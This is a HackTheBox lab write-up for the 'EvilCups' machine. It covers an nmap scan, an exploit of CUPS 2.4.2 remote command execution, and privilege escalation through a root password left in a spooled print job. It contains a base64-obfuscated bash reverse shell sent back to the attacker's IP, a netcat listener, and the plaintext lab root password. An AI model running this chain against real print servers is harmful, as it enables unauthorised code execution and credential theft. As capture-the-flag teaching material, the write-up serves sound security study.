@@ -1,0 +1,638 @@
+---
+layout: writeup
+category: HackTheBox
+chall_description: https://app.hackthebox.com/machines/EvilCups
+points: 0
+solves: 28427
+tags: Linux Cups
+date: 2024-10-22
+comments: true
+---
+
+<img src="/assets/images/htb/evilcups/icon.webp" alt="" width="40%">
+
+# Information
+EvilCups is a medium machine where we will find a system with `CUPS` where we will be able to exploit a remote execution of commands gaining access to the system as the `lp` user. You can see this in more detail in this [Blog](https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/). We will achieve root thanks to investigation of some configuration files of *CUPS* where in a data file we will find some credentials.
+
+# Enumeration
+
+We start with a nmap scan:
+
+```bash
+# Nmap 7.94SVN scan initiated Sat Oct 12 10:17:47 2024 as: nmap -p- --open -sSCV -n -Pn -vvv -oN targetscan 10.10.11.40
+Nmap scan report for 10.10.11.40
+Host is up, received user-set (0.11s latency).
+Scanned at 2024-10-12 10:17:47 CEST for 122s
+Not shown: 64270 closed tcp ports (reset), 1263 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT    STATE SERVICE REASON         VERSION
+22/tcp  open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
+| ssh-hostkey: 
+|   256 36:49:95:03:8d:b4:4c:6e:a9:25:92:af:3c:9e:06:66 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLhyWEKe+YMaLWwGVFwyHt8c6bWzFkIrhtFZYPkBfui0+1IrwnUmA3TZq1yQ9vN7Jn+Id6YxfaXO7CfraX69S/Y=
+|   256 9f:a4:a9:39:11:20:e0:96:ee:c4:9a:69:28:95:0c:60 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICsRxZMgAIyL7cg9PIv83wIGkMGjzbkzS1jktKqQ6Kij
+631/tcp open  ipp     syn-ack ttl 63 CUPS 2.4
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-title: Home - CUPS 2.4.2
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Oct 12 10:19:49 2024 -- 1 IP address (1 host up) scanned in 122.31 seconds
+```
+
+| PORT | SERVICE       |
+|------|---------------|
+| 22   | OpenSSH 9.2p1 |
+| 631  | CUPS 2.4      |
+
+Let's access port 631 to see CUPS:
+
+![](/assets/images/htb/evilcups/1.png)
+
+Searching a bit for the `CUPS 2.4.2` vulnerability I found this:
+
+- [https://github.com/IppSec/evil-cups](https://github.com/IppSec/evil-cups)
+
+# Foothold
+
+Let's download the `evilcups.py` file:
+```bash
+❯ wget https://raw.githubusercontent.com/IppSec/evil-cups/refs/heads/main/evilcups.py
+--2024-10-22 22:26:58--  https://raw.githubusercontent.com/IppSec/evil-cups/refs/heads/main/evilcups.py
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.109.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 7511 (7,3K) [text/plain]
+Saving to: ‘evilcups.py’
+
+evilcups.py                                    100%[==================================================================================================>]   7,33K  --.-KB/s    in 0s      
+
+2024-10-22 22:26:58 (15,0 MB/s) - ‘evilcups.py’ saved [7511/7511]
+```
+
+If we run the exploit it will ask us to install the `ippserver` requirement, I created a venv in python and installed ippserver:
+```bash
+(venv) pip install ippserver
+```
+
+Now we will be able to run the *evilcups.py* without problems:
+```bash
+❯ python3 evilcups.py
+evilcups.py <LOCAL_HOST> <TARGET_HOST> <COMMAND>
+```
+
+We are asked to enter our IP the IP of the machine and the command we want to execute. In our case it will be a reverse shell, I will use a base64 one:
+
+```bash
+❯ python3 evilcups.py 10.10.16.87 10.10.11.40 "echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi44Ny85MDA4IDA+JjEKCg==' | base64 -d | bash"
+```
+
+Before hitting it, we will listen to the port set in the reverse shell:
+
+```bash
+❯ nc -nlvp 9008
+```
+
+Now we will click on the script and it will tell us that it may take about 30 seconds:
+```bash
+❯ python3 evilcups.py 10.10.16.87 10.10.11.40 "echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi44Ny85MDA4IDA+JjEKCg==' | base64 -d | bash"
+IPP Server Listening on ('10.10.16.87', 12345)
+Sending udp packet to 10.10.11.40:631...
+Please wait this normally takes 30 seconds...
+```
+
+We will wait those 30 seconds to see if we get the reverse shell, in my case I have waited the 30 seconds and nothing happened. What we will do is to go to the CUPS web and go to the following `Printers -> HACKED_YOUR_IP_ADDRES_TUN0` and select it: 
+
+![](/assets/images/htb/evilcups/2.png)
+
+Now we will give him where it puts `Maintenance` and we will select `Print test page` and we will see that the script already is doing something and we will achieve reverse shell:
+
+```bash
+❯ python3 evilcups.py 10.10.16.87 10.10.11.40 "echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi44Ny85MDA4IDA+JjEKCg==' | base64 -d | bash"
+IPP Server Listening on ('10.10.16.87', 12345)
+Sending udp packet to 10.10.11.40:631...
+Please wait this normally takes 30 seconds...
+46 elapsed
+target connected, sending payload ...
+```
+
+```bash
+❯ nc -nlvp 9008
+listening on [any] 9008 ...
+connect to [10.10.16.87] from (UNKNOWN) [10.10.11.40] 51920
+bash: cannot set terminal process group (1565): Inappropriate ioctl for device
+bash: no job control in this shell
+lp@evilcups:/$ 
+```
+
+To see the `user.txt` we will go to `/home/` and we will be able to see a user named `htb` inside his home we will find the flag:
+
+```bash
+lp@evilcups:/$ cat /home/htb/user.txt 
+aa2c7a14412a2****************
+```
+
+# Privilege Escalation
+
+If we do a `cd` and then a `pwd` we will be able to see that we are in the directory `/var/spool/cups/tmp` if we go back we will not be able to do much because we do not have permissions:
+```bash
+lp@evilcups:~$ pwd
+/var/spool/cups/tmp
+lp@evilcups:~$ cd ..
+lp@evilcups:/var/spool/cups$ ls -la
+ls: cannot open directory '.': Permission denied
+```
+
+Searching through the CUPS documentation I managed to find the location of the configuration files:
+![](/assets/images/htb/evilcups/3.png)
+
+- [https://openprinting.github.io/cups/doc/spec-design.html](https://openprinting.github.io/cups/doc/spec-design.html)
+
+We will try doing a cat to each of these files to see if one of them is valid:
+
+```bash
+lp@evilcups:/var/spool/cups$ cat d00001-001
+%!PS-Adobe-3.0
+%%BoundingBox: 18 36 577 806
+%%Title: Enscript Output
+%%Creator: GNU Enscript 1.6.5.90
+%%CreationDate: Sat Sep 28 09:31:01 2024
+%%Orientation: Portrait
+%%Pages: (atend)
+%%DocumentMedia: A4 595 842 0 () ()
+%%DocumentNeededResources: (atend)
+%%EndComments
+%%BeginProlog
+%%BeginResource: procset Enscript-Prolog 1.6.5 90
+%
+% Procedures.
+%
+
+/_S {	% save current state
+  /_s save def
+} def
+/_R {	% restore from saved state
+  _s restore
+} def
+
+/S {	% showpage protecting gstate
+  gsave
+  showpage
+  grestore
+} bind def
+
+/MF {	% fontname newfontname -> -	make a new encoded font
+  /newfontname exch def
+  /fontname exch def
+
+  /fontdict fontname findfont def
+  /newfont fontdict maxlength dict def
+
+  fontdict {
+    exch
+    dup /FID eq {
+      % skip FID pair
+      pop pop
+    } {
+      % copy to the new font dictionary
+      exch newfont 3 1 roll put
+    } ifelse
+  } forall
+
+  newfont /FontName newfontname put
+
+  % insert only valid encoding vectors
+  encoding_vector length 256 eq {
+    newfont /Encoding encoding_vector put
+  } if
+
+  newfontname newfont definefont pop
+} def
+
+/MF_PS { % fontname newfontname -> -	make a new font preserving its enc
+  /newfontname exch def
+  /fontname exch def
+
+  /fontdict fontname findfont def
+  /newfont fontdict maxlength dict def
+
+  fontdict {
+    exch
+    dup /FID eq {
+      % skip FID pair
+      pop pop
+    } {
+      % copy to the new font dictionary
+      exch newfont 3 1 roll put
+    } ifelse
+  } forall
+
+  newfont /FontName newfontname put
+
+  newfontname newfont definefont pop
+} def
+
+/SF { % fontname width height -> -	set a new font
+  /height exch def
+  /width exch def
+
+  findfont
+  [width 0 0 height 0 0] makefont setfont
+} def
+
+/SUF { % fontname width height -> -	set a new user font
+  /height exch def
+  /width exch def
+
+  /F-gs-user-font MF
+  /F-gs-user-font width height SF
+} def
+
+/SUF_PS { % fontname width height -> -	set a new user font preserving its enc
+  /height exch def
+  /width exch def
+
+  /F-gs-user-font MF_PS
+  /F-gs-user-font width height SF
+} def
+
+/M {moveto} bind def
+/s {show} bind def
+
+/Box {	% x y w h -> -			define box path
+  /d_h exch def /d_w exch def /d_y exch def /d_x exch def
+  d_x d_y  moveto
+  d_w 0 rlineto
+  0 d_h rlineto
+  d_w neg 0 rlineto
+  closepath
+} def
+
+/bgs {	% x y height blskip gray str -> -	show string with bg color
+  /str exch def
+  /gray exch def
+  /blskip exch def
+  /height exch def
+  /y exch def
+  /x exch def
+
+  gsave
+    x y blskip sub str stringwidth pop height Box
+    gray setgray
+    fill
+  grestore
+  x y M str s
+} def
+
+/bgcs { % x y height blskip red green blue str -> -  show string with bg color
+  /str exch def
+  /blue exch def
+  /green exch def
+  /red exch def
+  /blskip exch def
+  /height exch def
+  /y exch def
+  /x exch def
+
+  gsave
+    x y blskip sub str stringwidth pop height Box
+    red green blue setrgbcolor
+    fill
+  grestore
+  x y M str s
+} def
+
+% Highlight bars.
+/highlight_bars {	% nlines lineheight output_y_margin gray -> -
+  gsave
+    setgray
+    /ymarg exch def
+    /lineheight exch def
+    /nlines exch def
+
+    % This 2 is just a magic number to sync highlight lines to text.
+    0 d_header_y ymarg sub 2 sub translate
+
+    /cw d_output_w cols div def
+    /nrows d_output_h ymarg 2 mul sub lineheight div cvi def
+
+    % for each column
+    0 1 cols 1 sub {
+      cw mul /xp exch def
+
+      % for each rows
+      0 1 nrows 1 sub {
+        /rn exch def
+        rn lineheight mul neg /yp exch def
+        rn nlines idiv 2 mod 0 eq {
+	 % Draw highlight bar.  4 is just a magic indentation.
+	 xp 4 add yp cw 8 sub lineheight neg Box fill
+	} if
+      } for
+    } for
+
+  grestore
+} def
+
+% Line highlight bar.
+/line_highlight {	% x y width height gray -> -
+  gsave
+    /gray exch def
+    Box gray setgray fill
+  grestore
+} def
+
+% Column separator lines.
+/column_lines {
+  gsave
+    .1 setlinewidth
+    0 d_footer_h translate
+    /cw d_output_w cols div def
+    1 1 cols 1 sub {
+      cw mul 0 moveto
+      0 d_output_h rlineto stroke
+    } for
+  grestore
+} def
+
+% Column borders.
+/column_borders {
+  gsave
+    .1 setlinewidth
+    0 d_footer_h moveto
+    0 d_output_h rlineto
+    d_output_w 0 rlineto
+    0 d_output_h neg rlineto
+    closepath stroke
+  grestore
+} def
+
+% Do the actual underlay drawing
+/draw_underlay {
+  ul_style 0 eq {
+    ul_str true charpath stroke
+  } {
+    ul_str show
+  } ifelse
+} def
+
+% Underlay
+/underlay {	% - -> -
+  gsave
+    0 d_page_h translate
+    d_page_h neg d_page_w atan rotate
+
+    ul_gray setgray
+    ul_font setfont
+    /dw d_page_h dup mul d_page_w dup mul add sqrt def
+    ul_str stringwidth pop dw exch sub 2 div ul_h_ptsize -2 div moveto
+    draw_underlay
+  grestore
+} def
+
+/user_underlay {	% - -> -
+  gsave
+    ul_x ul_y translate
+    ul_angle rotate
+    ul_gray setgray
+    ul_font setfont
+    0 0 ul_h_ptsize 2 div sub moveto
+    draw_underlay
+  grestore
+} def
+
+% Page prefeed
+/page_prefeed {		% bool -> -
+  statusdict /prefeed known {
+    statusdict exch /prefeed exch put
+  } {
+    pop
+  } ifelse
+} def
+
+% Wrapped line markers
+/wrapped_line_mark {	% x y charwith charheight type -> -
+  /type exch def
+  /h exch def
+  /w exch def
+  /y exch def
+  /x exch def
+
+  type 2 eq {
+    % Black boxes (like TeX does)
+    gsave
+      0 setlinewidth
+      x w 4 div add y M
+      0 h rlineto w 2 div 0 rlineto 0 h neg rlineto
+      closepath fill
+    grestore
+  } {
+    type 3 eq {
+      % Small arrows
+      gsave
+        .2 setlinewidth
+        x w 2 div add y h 2 div add M
+        w 4 div 0 rlineto
+        x w 4 div add y lineto stroke
+
+        x w 4 div add w 8 div add y h 4 div add M
+        x w 4 div add y lineto
+	w 4 div h 8 div rlineto stroke
+      grestore
+    } {
+      % do nothing
+    } ifelse
+  } ifelse
+} def
+
+% EPSF import.
+
+/BeginEPSF {
+  /b4_Inc_state save def    		% Save state for cleanup
+  /dict_count countdictstack def	% Count objects on dict stack
+  /op_count count 1 sub def		% Count objects on operand stack
+  userdict begin
+  /showpage { } def
+  0 setgray 0 setlinecap
+  1 setlinewidth 0 setlinejoin
+  10 setmiterlimit [ ] 0 setdash newpath
+  /languagelevel where {
+    pop languagelevel
+    1 ne {
+      false setstrokeadjust false setoverprint
+    } if
+  } if
+} bind def
+
+/EndEPSF {
+  count op_count sub { pos } repeat	% Clean up stacks
+  countdictstack dict_count sub { end } repeat
+  b4_Inc_state restore
+} bind def
+
+% Check PostScript language level.
+/languagelevel where {
+  pop /gs_languagelevel languagelevel def
+} {
+  /gs_languagelevel 1 def
+} ifelse
+%%EndResource
+%%BeginResource: procset Enscript-Encoding-88591 1.6.5 90
+/encoding_vector [
+/.notdef      	/.notdef      	/.notdef      	/.notdef      	
+/.notdef      	/.notdef      	/.notdef      	/.notdef      	
+/.notdef      	/.notdef      	/.notdef      	/.notdef      	
+/.notdef      	/.notdef      	/.notdef      	/.notdef      	
+/.notdef      	/.notdef      	/.notdef      	/.notdef      	
+/.notdef      	/.notdef      	/.notdef      	/.notdef      	
+/.notdef      	/.notdef      	/.notdef      	/.notdef      	
+/.notdef      	/.notdef      	/.notdef      	/.notdef      	
+/space        	/exclam       	/quotedbl     	/numbersign   	
+/dollar       	/percent      	/ampersand    	/quoteright   	
+/parenleft    	/parenright   	/asterisk     	/plus         	
+/comma        	/hyphen       	/period       	/slash        	
+/zero         	/one          	/two          	/three        	
+/four         	/five         	/six          	/seven        	
+/eight        	/nine         	/colon        	/semicolon    	
+/less         	/equal        	/greater      	/question     	
+/at           	/A            	/B            	/C            	
+/D            	/E            	/F            	/G            	
+/H            	/I            	/J            	/K            	
+/L            	/M            	/N            	/O            	
+/P            	/Q            	/R            	/S            	
+/T            	/U            	/V            	/W            	
+/X            	/Y            	/Z            	/bracketleft  	
+/backslash    	/bracketright 	/asciicircum  	/underscore   	
+/quoteleft    	/a            	/b            	/c            	
+/d            	/e            	/f            	/g            	
+/h            	/i            	/j            	/k            	
+/l            	/m            	/n            	/o            	
+/p            	/q            	/r            	/s            	
+/t            	/u            	/v            	/w            	
+/x            	/y            	/z            	/braceleft    	
+/bar          	/braceright   	/tilde        	/.notdef      	
+/.notdef      	/.notdef      	/.notdef      	/.notdef      	
+/.notdef      	/.notdef      	/.notdef      	/.notdef      	
+/.notdef      	/.notdef      	/.notdef      	/.notdef      	
+/.notdef      	/.notdef      	/.notdef      	/.notdef      	
+/.notdef      	/.notdef      	/.notdef      	/.notdef      	
+/.notdef      	/.notdef      	/.notdef      	/.notdef      	
+/.notdef      	/.notdef      	/.notdef      	/.notdef      	
+/.notdef      	/.notdef      	/.notdef      	/.notdef      	
+/space        	/exclamdown   	/cent         	/sterling     	
+/currency     	/yen          	/brokenbar    	/section      	
+/dieresis     	/copyright    	/ordfeminine  	/guillemotleft	
+/logicalnot   	/hyphen       	/registered   	/macron       	
+/degree       	/plusminus    	/twosuperior  	/threesuperior	
+/acute        	/mu           	/paragraph    	/bullet       	
+/cedilla      	/onesuperior  	/ordmasculine 	/guillemotright	
+/onequarter   	/onehalf      	/threequarters	/questiondown 	
+/Agrave       	/Aacute       	/Acircumflex  	/Atilde       	
+/Adieresis    	/Aring        	/AE           	/Ccedilla     	
+/Egrave       	/Eacute       	/Ecircumflex  	/Edieresis    	
+/Igrave       	/Iacute       	/Icircumflex  	/Idieresis    	
+/Eth          	/Ntilde       	/Ograve       	/Oacute       	
+/Ocircumflex  	/Otilde       	/Odieresis    	/multiply     	
+/Oslash       	/Ugrave       	/Uacute       	/Ucircumflex  	
+/Udieresis    	/Yacute       	/Thorn        	/germandbls   	
+/agrave       	/aacute       	/acircumflex  	/atilde       	
+/adieresis    	/aring        	/ae           	/ccedilla     	
+/egrave       	/eacute       	/ecircumflex  	/edieresis    	
+/igrave       	/iacute       	/icircumflex  	/idieresis    	
+/eth          	/ntilde       	/ograve       	/oacute       	
+/ocircumflex  	/otilde       	/odieresis    	/divide       	
+/oslash       	/ugrave       	/uacute       	/ucircumflex  	
+/udieresis    	/yacute       	/thorn        	/ydieresis    	
+] def
+%%EndResource
+%%EndProlog
+%%BeginSetup
+%%IncludeResource: font Courier-Bold
+%%IncludeResource: font Courier
+/HFpt_w 10 def
+/HFpt_h 10 def
+/Courier-Bold /HF-gs-font MF
+/HF /HF-gs-font findfont [HFpt_w 0 0 HFpt_h 0 0] makefont def
+/Courier /F-gs-font MF
+/F-gs-font 10 10 SF
+/#copies 1 def
+% Pagedevice definitions:
+gs_languagelevel 1 gt {
+  <<
+    /PageSize [595 842] 
+  >> setpagedevice
+} if
+%%BeginResource: procset Enscript-Header-simple 1.6.5 90
+
+/do_header {	% print default simple header
+  gsave
+    d_header_x d_header_y HFpt_h 3 div add translate
+
+    HF setfont
+    user_header_p {
+      5 0 moveto user_header_left_str show
+
+      d_header_w user_header_center_str stringwidth pop sub 2 div
+      0 moveto user_header_center_str show
+
+      d_header_w user_header_right_str stringwidth pop sub 5 sub
+      0 moveto user_header_right_str show
+    } {
+      5 0 moveto fname show
+      45 0 rmoveto fmodstr show
+      45 0 rmoveto pagenumstr show
+    } ifelse
+
+  grestore
+} def
+%%EndResource
+/d_page_w 559 def
+/d_page_h 770 def
+/d_header_x 0 def
+/d_header_y 755 def
+/d_header_w 559 def
+/d_header_h 15 def
+/d_footer_x 0 def
+/d_footer_y 0 def
+/d_footer_w 559 def
+/d_footer_h 0 def
+/d_output_w 559 def
+/d_output_h 755 def
+/cols 1 def
+%%EndSetup
+%%Page: (1) 1
+%%BeginPageSetup
+_S
+18 36 translate
+/pagenum 1 def
+/fname (pass.txt) def
+/fdir (.) def
+/ftail (pass.txt) def
+% User defined strings:
+/fmodstr (Sat Sep 28 09:30:10 2024) def
+/pagenumstr (1) def
+/user_header_p false def
+/user_footer_p false def
+%%EndPageSetup
+do_header
+5 742 M
+(Br3@k-G!@ss-r00t-evilcups) s
+_R
+S
+%%Trailer
+%%Pages: 1
+%%DocumentNeededResources: font Courier-Bold Courier 
+%%EOF
+```
+
+We got some credentials, we will test to see if they are the root credentials:
+
+```bash
+lp@evilcups:/var/spool/cups$ su -
+Password: 
+root@evilcups:~# cat /root/root.txt 
+6331ea26e5a997c******************
+```
